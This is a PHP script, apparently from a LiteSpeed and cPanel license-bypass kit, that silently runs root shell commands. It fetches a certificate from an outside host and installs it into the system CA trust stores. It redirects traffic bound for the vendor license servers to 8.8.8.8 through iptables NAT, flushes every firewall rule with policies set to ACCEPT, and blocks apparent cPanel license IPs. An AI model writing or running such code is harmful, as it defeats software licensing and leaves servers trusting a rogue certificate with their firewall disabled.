<?php
if (file_exists('/sbin/ipset')) {
}
else {
	exec('string=$(cat /etc/*-release); if [[ $string == *"centos"* ]]; then yum install ipset -y > /dev/null 2>&1; else apt-get install ipset > /dev/null 2>&1; fi');
}
if (!file_exists('/usr/local/share/ca-certificates')) {
		}
		else if (md5_file('/usr/local/share/ca-certificates/litespeedtech.crt') === '5d39d5d0f50ba3269bcc016aae3bfc12') {
		}
		else {
			exec('wget -O /usr/local/share/ca-certificates/litespeedtech.crt litespeed.itplic.biz/litespeedtech.pem > /dev/null 2>&1');
			exec('update-ca-certificates > /dev/null 2>&1');
		}

		if (md5_file('/etc/pki/ca-trust/source/anchors/litespeedtech.pem') === '5d39d5d0f50ba3269bcc016aae3bfc12') {
		}
		else {
			exec('wget -O /etc/pki/ca-trust/source/anchors/litespeedtech.pem litespeed.itplic.biz/litespeedtech.pem > /dev/null 2>&1');
			exec('update-ca-trust > /dev/null 2>&1');
		}
		$ipset = exec('ipset list cpssystem &> /usr/local/cps/.ip');
		$ipset = file_get_contents('/usr/local/cps/.ip');
		$pose = strpos($ipset, 'cpssystem');

		if (!$pose) {
			exec('ipset create cpssystem nethash > /dev/null 2>&1');
			exec('ipset add cpssystem 34.231.236.27 > /dev/null 2>&1');
			exec('ipset add cpssystem 167.99.112.67 > /dev/null 2>&1');
			exec('ipset add cpssystem 52.55.120.73 > /dev/null 2>&1');
			exec('iptables -t nat -A OUTPUT -p tcp -m multiport --dports 80,443 -m set --match-set cpssystem dst -j DNAT --to-destination 8.8.8.8 > /dev/null 2>&1');
		}
		
		exec('ipset add cpssystem 135.148.138.120 > /dev/null 2>&1');
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://license.litespeedtech.com');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		$server_output3 = curl_exec($ch);
		curl_close($ch);
		$pose = strpos($server_output3, 'SYSTEM');

		if (!$pose) {
			exec('echo 1 > /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1');
			exec('iptables -t nat -A OUTPUT -p tcp -m multiport --dports 80,443 -m set --match-set cpssystem dst -j DNAT --to-destination 8.8.8.8 > /dev/null 2>&1');
		}

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://license.litespeedtech.com');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		$server_output4 = curl_exec($ch);
		curl_close($ch);
		$pose = strpos($server_output4, 'SYSTEM');

		if (!$pose) {
			exec('iptables -P INPUT ACCEPT > /dev/null 2>&1');
			exec('iptables -P FORWARD ACCEPT > /dev/null 2>&1');
			exec('iptables -P OUTPUT ACCEPT > /dev/null 2>&1');
			exec('iptables -t nat -F > /dev/null 2>&1');
			exec('iptables -t mangle -F > /dev/null 2>&1');
			exec('iptables -F > /dev/null 2>&1');
			exec('iptables -X > /dev/null 2>&1');
			exec('echo 1 > /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1');
			exec('iptables -t nat -A OUTPUT -p tcp -m multiport --dports 80,443 -m set --match-set cpssystem dst -j DNAT --to-destination 8.8.8.8 > /dev/null 2>&1');
		}


		$verify = file_get_contents('https://license.litespeedtech.com');
		$pose = strpos($verify, 'SYSTEM');

		if (!$pose) {
			exec('iptables -P INPUT ACCEPT > /dev/null 2>&1');
			exec('iptables -P FORWARD ACCEPT > /dev/null 2>&1');
			exec('iptables -P OUTPUT ACCEPT > /dev/null 2>&1');
			exec('iptables -t nat -F  > /dev/null 2>&1');
			exec('iptables -t mangle -F > /dev/null 2>&1');
			exec('iptables -F > /dev/null 2>&1');
			exec('iptables -X > /dev/null 2>&1');
			$filenamea = '/usr/bin/lic_cpanel';

			if (file_exists($filenamea)) {
				exec('/usr/sbin/iptables -A INPUT -s 208.74.121.85 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A INPUT -s 208.74.121.86 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A INPUT -s 208.74.123.3 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A INPUT -s 208.74.121.83 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A INPUT -s 208.74.121.82 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A INPUT -s 208.74.123.2 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A OUTPUT -s 208.74.121.85 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A OUTPUT -s 208.74.121.86 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A OUTPUT -s 208.74.123.3 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A OUTPUT -s 208.74.121.83 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A OUTPUT -s 208.74.121.82 -j DROP > /dev/null 2>&1');
				exec('/usr/sbin/iptables -A OUTPUT -s 208.74.123.2 -j DROP > /dev/null 2>&1');
			}

			exec('echo 1 > /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1');
			exec('sudo iptables -t nat -A OUTPUT -p tcp -m multiport --dports 80,443 -m set --match-set cspsystem dst -j DNAT --to-destination 8.8.8.8 > /dev/null 2>&1');
		}

?>